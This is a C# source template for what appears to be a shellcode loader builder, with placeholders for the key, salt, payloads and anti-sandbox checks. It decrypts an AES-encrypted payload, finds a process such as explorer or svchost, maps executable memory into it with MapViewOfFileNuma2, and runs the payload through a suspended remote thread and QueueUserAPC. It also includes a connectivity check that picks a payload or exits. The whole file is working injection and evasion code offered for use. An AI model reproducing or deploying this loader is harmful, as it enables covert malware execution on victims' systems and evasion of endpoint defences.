using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace BY
{
    public class Mapping
    {
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        private static readonly UInt32 NUMA_NO_PREFERRED_NODE = 0xffffffff;

        #region structs

        public enum FileMapProtection : uint
        {
            PageReadonly = 0x02,
            PageReadWrite = 0x04,
            PageWriteCopy = 0x08,
            PageExecuteRead = 0x20,
            PageExecuteReadWrite = 0x40,
            SectionCommit = 0x8000000,
            SectionImage = 0x1000000,
            SectionNoCache = 0x10000000,
            SectionReserve = 0x4000000,
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        public enum FileMapAccessType : uint
        {
            Copy = 0x01,
            Write = 0x02,
            Read = 0x04,
            AllAccess = 0x08,
            Execute = 0x20,
        }

        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum CreationFlags : uint
        {
            RunImmediately = 0,
            CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
        }

        #endregion structs

        #region navfunc

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(
           IntPtr hFile,
           IntPtr lpFileMappingAttributes,
           FileMapProtection flProtect,
           uint dwMaximumSizeHigh,
           uint dwMaximumSizeLow,
           [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr MapViewOfFile(
            IntPtr hFileMappingObject,
            FileMapAccessType dwDesiredAccess,
            uint dwFileOffsetHigh,
            uint dwFileOffsetLow,
            uint dwNumberOfBytesToMap);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernelbase.dll", SetLastError = true)]
        public static extern IntPtr MapViewOfFileNuma2(
            IntPtr FileMappingHandle,
            IntPtr ProcessHandle,
            UInt64 Offset,
            IntPtr BaseAddress,
            int ViewSize,
            UInt32 AllocationType,
            UInt32 PageProtection,
            UInt32 Numa);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        #endregion navfunc

        public static int FindProcessIDByName()
        {
            int processpid = 0;
            List<string> processnames = new List<string> { "notepad", "explorer", "svchost" };
            Process[] processlist = Process.GetProcesses();
            foreach (var item in processnames)
            {
                foreach (Process p in processlist)
                {
                    if (p.ProcessName.ToLower() == item)
                    {
                        processpid = p.Id;
                        return processpid;
                    }
                }
            }

            return processpid;
        }

        public static string CheckNet(string str1, string str2, string domainname = "baidu.com")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + domainname);
            request.Method = "HEAD";
            request.Timeout = 8000;
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                return str1;
            }
            catch (WebException e)
            {
                try
                {
                    IPAddress[] ipAddresses = Dns.GetHostAddresses(domainname);
                    if (ipAddresses != null)
                    {
                        return str2;
                    }
                }
                catch (ArgumentNullException)
                {
                    Environment.Exit(-1);
                }
            }
            return "";
        }

        public static byte[] Decrypt(string bs, string keys)
        {
            var bytesToBeDecrypted = Convert.FromBase64String(bs);
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keys));
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes("{{Salt}}");

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private static string GetProcess(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }

   {{CheckCPUlMemoryLang}}
    {{CheckHardDiskSpace}}
    {{CheckMACAddress}}
    {{CheckProcess}}
    {{ChecksleepAcceleration}}
    {{CheckStartTime}}		
        private static void Main(string[] args)
        {
		    {{CheckCPUlMemoryLang_RUN}}
    {{CheckHardDiskSpace_RUN}}
    {{CheckMACAddress_RUN}}
    {{CheckProcess_RUN}}
    {{ChecksleepAcceleration_RUN}}
    {{CheckStartTime_RUN}}
             string str1 = "{{context1}}";
            string str2 = "{{context2}}";
            string str = str1 != "" ? (str2 != "" ? CheckNet(str1, str2) : str1) : (str2 != "" ? str2 : "");
            if (str=="")
            {
                Environment.Exit(-1);
            }        
            int processpid = FindProcessIDByName();
            byte[] buf1 = Decrypt(str, "{{keyText}}");
            IntPtr Mapping_handle = CreateFileMapping(
               INVALID_HANDLE_VALUE,
               IntPtr.Zero,
               FileMapProtection.PageExecuteReadWrite,
               0,
               (uint)buf1.Length,
               null
           );

            IntPtr MapViewOfFile_address = MapViewOfFile(Mapping_handle, FileMapAccessType.Write, 0, 0, (uint)buf1.Length);
            Marshal.Copy(buf1, 0, MapViewOfFile_address, buf1.Length);

            IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, processpid);
            IntPtr MapRemote_address = MapViewOfFileNuma2(
                Mapping_handle,
                Process_handle,
                0,
                IntPtr.Zero,
                0,
                0,
                (uint)AllocationProtect.PAGE_EXECUTE_READ,
                NUMA_NO_PREFERRED_NODE);

            uint Thread_id = 0;
            IntPtr Thread_handle = CreateRemoteThread(
                Process_handle,
                IntPtr.Zero,
                0,
                (IntPtr)0xfff,
                IntPtr.Zero,
                (uint)CreationFlags.CREATE_SUSPENDED,
                out Thread_id);

            QueueUserAPC(MapRemote_address, Thread_handle, 0);
            ResumeThread(Thread_handle);
            CloseHandle(Process_handle);
            CloseHandle(Thread_handle);
        }
    }
}